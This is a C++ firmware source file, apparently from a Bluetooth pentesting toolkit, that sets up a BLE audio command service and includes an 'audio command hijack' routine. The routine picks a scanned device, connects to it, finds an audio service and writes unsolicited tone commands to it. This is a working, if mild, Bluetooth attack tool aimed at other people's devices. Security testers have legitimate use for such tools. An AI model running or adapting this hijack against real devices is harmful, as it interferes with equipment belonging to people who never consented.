#include "whisperpair_audio.h"
#include "whisperpair.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>

AudioCommandService audioCmd;

void AudioCommandService::AudioCmdCallbacks::onWrite(BLECharacteristic* pCharacteristic) {
    std::string value = pCharacteristic->getValue();
    if(value.length() > 0) {
        Serial.printf("[AudioCMD] Received: %s\n", value.c_str());
    }
}

void AudioCommandService::begin() {
    if(isRunning) return;
    
    initBLEIfNeeded("audio_cmd");
    
    pServer = BLEDevice::createServer();
    pService = pServer->createService("19B10000-E8F2-537E-4F6C-D104768A1214");
    pAudioCmdChar = pService->createCharacteristic(
        "19B10001-E8F2-537E-4F6C-D104768A1214",
        BLECharacteristic::PROPERTY_READ | 
        BLECharacteristic::PROPERTY_WRITE | 
        BLECharacteristic::PROPERTY_NOTIFY
    );
    pAudioCmdChar->setCallbacks(new AudioCmdCallbacks());
    pAudioDataChar = pService->createCharacteristic(
        "19B10002-E8F2-537E-4F6C-D104768A1214",
        BLECharacteristic::PROPERTY_WRITE_NR | 
        BLECharacteristic::PROPERTY_NOTIFY
    );
    pService->start();
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();
    isRunning = true;
}

void AudioCommandService::sendAudioCommand(const char* cmd) {
    if(pAudioCmdChar && isRunning) {
        pAudioCmdChar->setValue((uint8_t*)cmd, strlen(cmd));
        pAudioCmdChar->notify();
    }
}

void AudioCommandService::sendAudioTone(uint8_t frequency, uint16_t duration_ms) {
    uint8_t toneCmd[7] = {
        'T', 'O', 'N', 'E',
        (uint8_t)(frequency >> 8),
        (uint8_t)(frequency & 0xFF),
        (uint8_t)(duration_ms / 100)
    };
    sendAudioCommand((char*)toneCmd);
}

void AudioCommandService::stop() {
    if(isRunning) {
        BLEDevice::deinit(true);
        isRunning = false;
    }
}

bool attemptAudioCommandHijack(BLEAddress target) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("AUDIO HIJACK");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Connecting...");
    
    initBLEIfNeeded();
    
    BLEClient* pClient = BLEDevice::createClient();
    if(!pClient->connect(target)) {
        displayMessage("Failed to connect", "", "", "", TFT_WHITE);
        BLEDevice::deleteClient(pClient);
        return false;
    }
    tft.setCursor(20, 80);
    tft.print("Connected");
    tft.setCursor(20, 100);
    tft.print("Discovering...");
    
    BLERemoteService* pService = pClient->getService(BLEUUID("19B10000-E8F2-537E-4F6C-D104768A1214"));
    if(!pService) pService = pClient->getService(BLEUUID((uint16_t)0x1843));
    if(!pService) {
        displayMessage("No audio service", "", "", "", TFT_WHITE);
        pClient->disconnect();
        BLEDevice::deleteClient(pClient);
        return false;
    }
    tft.setCursor(20, 120);
    tft.print("Audio service found");
    tft.setCursor(20, 140);
    tft.print("Sending tones...");
    
    uint16_t tones[] = {440, 550, 660, 770};
    for(int i = 0; i < 4; i++) {
        uint8_t toneCmd[7] = {
            'T', 'O', 'N', 'E',
            (uint8_t)(tones[i] >> 8),
            (uint8_t)(tones[i] & 0xFF),
            100
        };
        BLERemoteCharacteristic* pChar = pService->getCharacteristic(BLEUUID("19B10001-E8F2-537E-4F6C-D104768A1214"));
        if(pChar) pChar->writeValue(toneCmd, sizeof(toneCmd), false);
        delay(200);
    }
    pClient->disconnect();
    BLEDevice::deleteClient(pClient);
    return true;
}

void audioCommandHijackTest() {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("AUDIO CMD HIJACK");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    String selectedMAC = selectTargetFromScan("SELECT TARGET");
    if(selectedMAC.isEmpty()) return;
    BLEAddress target(selectedMAC.c_str());
    if(!requireSimpleConfirmation("Start audio CMD hijack?")) return;
    bool success = attemptAudioCommandHijack(target);
    if(success) displayMessage("SUCCESS!", "Audio commands sent", "", "", TFT_GREEN);
    else displayMessage("FAILED", "No audio service", "", "", TFT_RED);
}